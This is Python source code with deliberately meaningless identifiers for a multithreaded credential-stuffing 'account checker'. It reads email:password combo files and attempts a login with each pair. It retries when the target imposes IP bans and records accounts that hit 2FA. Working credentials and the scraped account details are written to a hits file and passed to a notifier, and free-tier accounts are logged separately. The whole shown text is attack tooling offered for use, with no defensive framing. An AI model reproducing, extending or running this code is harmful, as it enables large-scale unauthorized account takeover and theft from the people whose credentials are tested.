          class elhamdulillah:
              def __init__(self):
                  self.lock = threading.Lock()
                  self.total = 0
                  self.bababualemdeteek = 0
                  self.zencipuruna = 0
                  self.saxsko = 0
                  self.mahsummmedet = 0
              def yesiam(self, stat_type):
                  with self.lock:
                      self.total += 1
                      if stat_type == 'hit': self.bababualemdeteek += 1
                      elif stat_type == 'custom': self.zencipuruna += 1
                      elif stat_type == 'bad': self.saxsko += 1
                      elif stat_type == 'retry': self.mahsummmedet += 1

          buoc = 7
          budamakara = 1
          active_task = {'status': 'idle', 'thread': None, 'stats': None}
          log_queue = Queue()
          log_messages = []

          def biriyetmezikincisiolsun(queue, notifier, out_file, lock, stats, log_queue):
              while True:
                  item = queue.get()
                  if item is None: queue.task_done(); break
                  email, password = item
                  status = 'BAD'
                  babazingozingo = {}
                  results = {}
                  for attempt in range(budamakara + 1):
                      try:
                          checker = wearthelegend(email, password)
                          status, babazingozingo, results = checker.run()
                          break
                      except LoginError as e:
                          err = str(e)
                          if err == '2FA': status = '2FA'; break
                          elif err == 'IP BAN':
                              if attempt < budamakara:
                                  stats.yesiam('retry')
                                  log_queue.put(f'[RETRY] {email} — IP BAN')
                                  time.sleep(3); continue
                              status = 'BAD'; break
                          else: status = 'BAD'; break
                      except Exception as e:
                          if attempt < budamakara:
                              stats.yesiam('retry')
                              log_queue.put(f'[RETRY] {email} — {e}')
                              time.sleep(2); continue
                          status = 'BAD'; break
                  if status == 'HIT':
                      stats.yesiam('hit')
                      portakal = [f'{s}({d[\"total\"]})' for s, d in results.items()]
                      mandelina = ' | '.join(portakal)
                      yormamoruk = ' | '.join(f'{k}={v}' for k, v in babazingozingo.items())
                      line = f'{email}:{password} | {yormamoruk} | {mandelina}'
                      log_queue.put(f'[HIT] {email}:{password} | {yormamoruk} | {mandelina}')
                      with open(out_file, 'a', encoding='utf-8') as f: f.write(line + '\n')
                      if notifier: notifier.bababiziz(email, password, babazingozingo, results)
                  elif status == 'FREE':
                      stats.yesiam('custom')
                      yormamoruk = ' | '.join(f'{k}={v}' for k, v in babazingozingo.items())
                      line = f'{email}:{password} | {yormamoruk} | FREE'
                      log_queue.put(f'[FREE] {email}:{password} — {yormamoruk}')
                      with open('octofree.txt', 'a', encoding='utf-8') as f: f.write(line + '\n')
                  stats.yesiam('bad') if status == 'BAD' else None
                  queue.task_done()

          def altiustulegend(path):
              combos = []
              p = Path(path)
              if not p.exists(): return []
              with p.open('r', encoding='utf-8', errors='ignore') as f:
                  for line in f:
                      line = line.strip()
                      if not line or line.startswith('#'): continue
                      if ':' in line:
                          email, password = line.split(':', 1)
                          combos.append((email.strip(), password.strip()))
              return combos

